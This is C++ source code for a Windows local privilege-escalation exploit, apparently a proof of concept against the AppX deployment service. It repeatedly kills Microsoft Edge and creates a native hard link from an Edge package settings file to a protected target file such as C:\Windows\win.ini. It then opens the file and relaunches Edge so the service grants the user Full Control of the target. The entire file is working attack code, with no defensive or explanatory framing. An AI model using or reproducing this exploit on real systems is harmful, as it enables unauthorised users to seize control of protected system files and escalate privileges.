#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"
#include <TlHelp32.h>
#include <tchar.h>
#include "winbase.h"
#include <wchar.h>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <aclapi.h>
#include <iostream>
#include <fstream>
#include <iostream>
#include <comdef.h>
#include "base64.h"
#pragma comment(lib, "advapi32.lib")
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

bool CheckFilePermissions(_TCHAR* targetFile) {
	HANDLE hFile;

	printf("[*] Checking file privileges of %ls ...\n", targetFile);
	hFile = CreateFile(targetFile,
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[!] You don't have 'Modify/Write' privileges on this file\n");
		return false;
	}
	else
	{
		printf("[+] You have 'Full Control' over this file!\n");
		CloseHandle(hFile);
		return true;
	}
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname)
{
	std::wstring full_linkname = BuildFullPath(linkname, true);
	size_t len = full_linkname.size() * sizeof(WCHAR);

	typed_buffer_ptr<FILE_LINK_INFORMATION> link_info(sizeof(FILE_LINK_INFORMATION) + len - sizeof(WCHAR));

	memcpy(&link_info->FileName[0], full_linkname.c_str(), len);
	link_info->ReplaceIfExists = TRUE;
	link_info->FileNameLength = len;

	std::wstring full_targetname = BuildFullPath(targetname, true);

	HANDLE hFile = OpenFileNative(full_targetname.c_str(), nullptr, MAXIMUM_ALLOWED, FILE_SHARE_READ, 0);
	if (hFile)
	{
		DEFINE_NTDLL(ZwSetInformationFile);
		IO_STATUS_BLOCK io_status = { 0 };

		NTSTATUS status = fZwSetInformationFile(hFile, &io_status, link_info, link_info.size(), FileLinkInformation);
		CloseHandle(hFile);
		if (NT_SUCCESS(status))
		{
			return true;
		}
		SetNtLastError(status);
	}

	return false;
}

bool IsProcessRunning(const wchar_t* processName) {
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry)) {
		while (Process32Next(snapshot, &entry))
		{
			if (!wcsicmp(entry.szExeFile, processName))
			{
				exists = true;
			}
		}
	}

	CloseHandle(snapshot);
	return exists;
}

void KillProcessByName(const wchar_t* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcscmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

bool FileExists(const wchar_t* file) {
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(file) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		return false;
	}
	else
	{
		return true;
	}
}

bool CreateHardlink(_TCHAR* src, _TCHAR* dst) {
	if (CreateNativeHardlink(src, dst))
	{
		return true;
	}
	else
	{
		printf("\n[!] Error creating hardlink: %ls\n", GetErrorMessage().c_str());
		return false;
	}
}

void KillEdge() {
	TCHAR* processName = L"MicrosoftEdge.exe";

	printf("[*] Checking if %ls is currently running ...\n", processName);
	if (IsProcessRunning(processName))
	{
		while (IsProcessRunning(processName))
		{
			printf("[!] Killing %ls ...\n", processName);
			KillProcessByName(processName);
		}
	}
	else
	{
		printf("[+] %ls is not running!\n", processName);
	}
}

bool CreateMaliciousDatFile(_TCHAR* datFile, _TCHAR* dstFile) {
	bstr_t userProfile(_wgetenv(L"USERPROFILE"));
	bstr_t packagePath(L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\");
	bstr_t srcFile(userProfile + packagePath + datFile);
	
	printf("[*] Checking if %ls exists ... ", datFile);
	if (FileExists(srcFile))
	{
		printf("YES!\n");
	}
	else
	{
		printf("NO!\n");
	}
	
	printf("[+] Creating hard link to %ls ... ", dstFile);
	if (CreateHardlink(srcFile, dstFile))
	{
		printf("DONE!\n");
		return true;
	}

	return false;
}

void OpenFile(_TCHAR* datFile) {
	bstr_t userProfile(_wgetenv(L"USERPROFILE"));
	bstr_t packagePath(L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\");
	bstr_t srcFile(userProfile + packagePath + datFile);

	printf("[+] Opening %ls ... ", datFile);

	HANDLE hFile;
	hFile = CreateFile(
		srcFile,
		GENERIC_READ,
		0, // do not share 
		NULL,
		OPEN_EXISTING,          
		FILE_FLAG_OPEN_REPARSE_POINT,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("ERROR!\n");
		exit(1);
	}

	printf("DONE!\n");
	printf("[+] Starting Edge ...\n");
	system("cmd.exe /c start /b microsoft-edge:");
	Sleep(5000);
	CloseHandle(hFile);
}

int _tmain(int argc, _TCHAR* argv[])
{
	try
	{
		if (argc < 3)
		{
			printf("-----------------------------------------------------------------\n");
			printf("[*] Usage: AppXSvcEoP.exe <src> <dst>\n");
			printf("[*] (E.g., AppXSvcEoP.exe settings.dat.LOG2 C:\\Windows\\win.ini)\n");
			printf("-----------------------------------------------------------------\n");
		}
		else
		{
			if (CheckFilePermissions(argv[2]))
			{
				exit(0);
			}
			Sleep(1000);
			KillEdge();
			Sleep(1000);
			CreateMaliciousDatFile(argv[1], argv[2]);
			Sleep(1000);
			OpenFile(argv[1]);
			CheckFilePermissions(argv[2]);
		}
	}
	catch (...)
	{

	}
	exit(0);
}
